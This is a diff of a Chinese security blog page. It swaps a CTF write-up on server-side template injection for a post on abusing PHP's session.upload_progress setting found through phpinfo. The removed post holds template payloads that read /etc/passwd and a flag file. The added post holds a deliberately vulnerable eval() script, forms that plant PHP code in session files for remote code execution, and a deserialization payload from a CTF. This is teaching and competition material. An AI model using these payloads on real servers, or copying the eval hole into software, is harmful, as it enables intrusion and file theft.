@@ -79,17 +79,21 @@
 
 
 
-<meta name="description" content="源自HGAME-week3的一道题 NGC’S BLOGurl:1http://111.230.105.104:5000/hello/ngc 学习一波ssti参考链接 http://www.freebuf.com/vuls/83999.html        http://www.freebuf.com/articles/web/135953.html        http://www.free">
+<meta name="description" content="关于phpinfo()的不适当配置造成的危险漏洞 前言本文章测试环境基于osx+apache2+php5.6 0x00 session.upload_progress原理分析先来看php手册中给的定义 【http://php.net/manual/zh/session.upload-progress.php】 当 session.upload_progress.enabled INI 选项开启时，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SSTI（服务端模板注入攻击 ）">
-<meta property="og:url" content="http://altmanz.cn/2018/02/24/SSTI/index.html">
+<meta property="og:title" content="dangerous-phpinfo">
+<meta property="og:url" content="http://altmanz.cn/2018/10/08/dangerous-phpinfo/index.html">
 <meta property="og:site_name" content="Altm4nz">
-<meta property="og:description" content="源自HGAME-week3的一道题 NGC’S BLOGurl:1http://111.230.105.104:5000/hello/ngc 学习一波ssti参考链接 http://www.freebuf.com/vuls/83999.html        http://www.freebuf.com/articles/web/135953.html        http://www.free">
+<meta property="og:description" content="关于phpinfo()的不适当配置造成的危险漏洞 前言本文章测试环境基于osx+apache2+php5.6 0x00 session.upload_progress原理分析先来看php手册中给的定义 【http://php.net/manual/zh/session.upload-progress.php】 当 session.upload_progress.enabled INI 选项开启时，">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-23T17:15:00.000Z">
+<meta property="og:image" content="http://altmanz.cn/2018/10/08/dangerous-phpinfo/1.png">
+<meta property="og:image" content="http://altmanz.cn/2018/10/08/dangerous-phpinfo/2.png">
+<meta property="og:image" content="http://altmanz.cn/2018/10/08/dangerous-phpinfo/3.png">
+<meta property="og:updated_time" content="2018-10-08T09:19:43.712Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SSTI（服务端模板注入攻击 ）">
-<meta name="twitter:description" content="源自HGAME-week3的一道题 NGC’S BLOGurl:1http://111.230.105.104:5000/hello/ngc 学习一波ssti参考链接 http://www.freebuf.com/vuls/83999.html        http://www.freebuf.com/articles/web/135953.html        http://www.free">
+<meta name="twitter:title" content="dangerous-phpinfo">
+<meta name="twitter:description" content="关于phpinfo()的不适当配置造成的危险漏洞 前言本文章测试环境基于osx+apache2+php5.6 0x00 session.upload_progress原理分析先来看php手册中给的定义 【http://php.net/manual/zh/session.upload-progress.php】 当 session.upload_progress.enabled INI 选项开启时，">
+<meta name="twitter:image" content="http://altmanz.cn/2018/10/08/dangerous-phpinfo/1.png">
 
 
 
@@ -119,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://altmanz.cn/2018/02/24/SSTI/"/>
+  <link rel="canonical" href="http://altmanz.cn/2018/10/08/dangerous-phpinfo/"/>
 
 
 
 
 
-  <title>SSTI（服务端模板注入攻击 ） | Altm4nz</title>
+  <title>dangerous-phpinfo | Altm4nz</title>
   
 
 
@@ -232,7 +236,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/02/24/SSTI/">
+    <link itemprop="mainEntityOfPage" href="http://altmanz.cn/2018/10/08/dangerous-phpinfo/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Altm4nz">
@@ -249,7 +253,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SSTI（服务端模板注入攻击 ）</h1>
+          <h1 class="post-title" itemprop="name headline">dangerous-phpinfo</h1>
         
 
         <div class="post-meta">
@@ -261,8 +265,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-24T00:32:32+08:00">
-                2018-02-24
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-08T11:34:42+08:00">
+                2018-10-08
               </time>
             
 
@@ -299,11 +303,19 @@
       
 
       
-        <p>源自HGAME-week3的一道题 NGC’S BLOG<br>url:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">111.230</span>.<span class="number">105.104</span>:<span class="number">5000</span><span class="regexp">/hello/</span>ngc</span><br></pre></td></tr></table></figure></p>
-<p>学习一波ssti<br>参考链接 <a href="http://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/83999.html</a><br>        <a href="http://www.freebuf.com/articles/web/135953.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/135953.html</a><br>        <a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98928.html</a><br>这道题解法:<br>尝试SSTI注入:<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.230</span>.105.104:<span class="number">5000</span>/%7B%<span class="number">7B1</span>+<span class="number">1</span>%7D%7D</span><br></pre></td></tr></table></figure></p>
-<p>返回 2 。 说明存在注入 。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/%7B%7B1+1%7D%7D</span><br><span class="line">http://111.230.105.104:5000/%7B%7B''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>%7D%7D</span><br><span class="line">http://111.230.105.104:5000/%7B%7B%20''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[2].<span class="strong">__subclasses__</span>()%20%7D%7D</span><br><span class="line">http://111.230.105.104:5000/%7B%7B%20''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read()%20%7D%7D //读文件</span><br></pre></td></tr></table></figure></p>
-<p>提示了flag在flag中<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.230.105.104:5000/%7B%7B%20''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'./flag'</span>).read()%20%7D%7D</span><br></pre></td></tr></table></figure></p>
+        <p>关于phpinfo()的不适当配置造成的危险漏洞</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文章测试环境基于osx+apache2+php5.6</p>
+<h1 id="0x00-session-upload-progress"><a href="#0x00-session-upload-progress" class="headerlink" title="0x00 session.upload_progress"></a>0x00 session.upload_progress</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>先来看php手册中给的定义 【<a href="http://php.net/manual/zh/session.upload-progress.php】" target="_blank" rel="noopener">http://php.net/manual/zh/session.upload-progress.php】</a></p>
+<font face="微软雅黑">当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态<br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</font>
 
+<p>意味着我们可以通过向服务器POST一个表单,来控制$_session的内容。<br>构建一个简单的环境来测试。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">print_r($code);</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过phpinfo获得路径信息，session.upload_progress.name。<br><img src="/2018/10/08/dangerous-phpinfo/1.png" alt=""><br>然后构造上传文件的表单。直接引用官方的表单<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"&lt;?php echo ini_get("</span>session.upload_progress.name<span class="string">"); ?&gt;"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"file1"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"file2"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
+<p>稍做修改<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"POST"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> value=<span class="string">"&lt;?php echo 666;?&gt;"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"file1"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"file"</span> name=<span class="string">"file2"</span> /&gt;</span><br><span class="line"> &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
+<p>抓包后稍作修改，即可把value中的代码写入/tmp/sess_*中，再配合上LFI即可getshell。<br><img src="/2018/10/08/dangerous-phpinfo/2.png" alt=""></p>
+<h2 id="CTF实战"><a href="#CTF实战" class="headerlink" title="CTF实战"></a>CTF实战</h2><p><a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a><br>通过<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>知道使用的序列化处理器为php，通过查看phpinfo可知默认为php_serialize。再看到session.upload_progress.enabled=&gt;on.<br>很明显我们要通过Session Upload Progress来设置session，触发反序列化。<br>构造反序列化字符串<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">5</span>:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:38:\"print_r(scandir('/opt/lampp/htdocs'));\";&#125;</span></span><br><span class="line"><span class="string">//反斜杠防止引号被转义</span></span><br></pre></td></tr></table></figure></p>
+<p>构造POST文件的数据包成功执行命令<br><img src="/2018/10/08/dangerous-phpinfo/3.png" alt=""><br>剩下的就是常规操作了</p>
+<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1>
       
     </div>
     
@@ -327,8 +339,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/02/10/sqli-labs 4/" rel="next" title="sqli-labs(less54-less65)">
-                <i class="fa fa-chevron-left"></i> sqli-labs(less54-less65)
+              <a href="/2018/09/27/seacmsv6-61-getshell/" rel="next" title="seacms v6.61-GetShell">
+                <i class="fa fa-chevron-left"></i> seacms v6.61-GetShell
               </a>
             
           </div>
@@ -336,10 +348,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/03/03/hgame-week4/" rel="prev" title="hgame-week4">
-                hgame-week4 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -391,8 +399,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -457,6 +474,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-session-upload-progress"><span class="nav-number">2.</span> <span class="nav-text">0x00 session.upload_progress</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理分析"><span class="nav-number">2.1.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF实战"><span class="nav-number">2.2.</span> <span class="nav-text">CTF实战</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01"><span class="nav-number">3.</span> <span class="nav-text">0x01</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
